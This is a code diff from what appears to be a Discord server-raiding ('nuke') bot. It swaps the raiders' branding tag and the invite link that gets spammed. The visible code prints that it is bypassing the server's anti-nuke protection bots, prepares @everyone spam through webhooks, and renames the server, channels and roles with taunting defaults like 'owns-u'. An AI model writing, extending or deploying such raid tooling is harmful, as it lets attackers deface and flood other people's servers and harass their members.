@@ -51,9 +51,9 @@ class Nuke(commands.Cog):
         if found:
             print(f"[!] Antinuke-Bots found:\n" + "\n".join(found) + "\nbypassing...")
 
-            webhook_message = user_config.get("webhook_message", "insomnia owns this")
-            if webhook_message in ["insomnia owns this", "Server has been nuked!"]:
-                spam_message = "@everyone discord.gg/VSQzzAMVw3 https://www.youtube.com/watch?v=FMwC4TtNvbI"
+            webhook_message = user_config.get("webhook_message", "zne owns this")
+            if webhook_message in ["zne owns this", "Server has been nuked!"]:
+                spam_message = "@everyone discord.gg/Y6qZ4TKRM5 https://www.youtube.com/watch?v=FMwC4TtNvbI"
             else:
                 spam_message = webhook_message
 
@@ -69,10 +69,10 @@ class Nuke(commands.Cog):
 
         save_nuke_stats(user.id, guild)
 
-        channel_name = user_config.get("channel_name", "insomnia-on-top")
-        webhook_message = user_config.get("webhook_message", "insomnia owns this")
+        channel_name = user_config.get("channel_name", "zne-on-top")
+        webhook_message = user_config.get("webhook_message", "zne owns this")
         server_name = user_config.get("server_name", guild.name)
-        role_name = user_config.get("role_name", "insomnia-owns-u")
+        role_name = user_config.get("role_name", "zne-owns-u")
 
         try:
             await guild.edit(name=server_name)
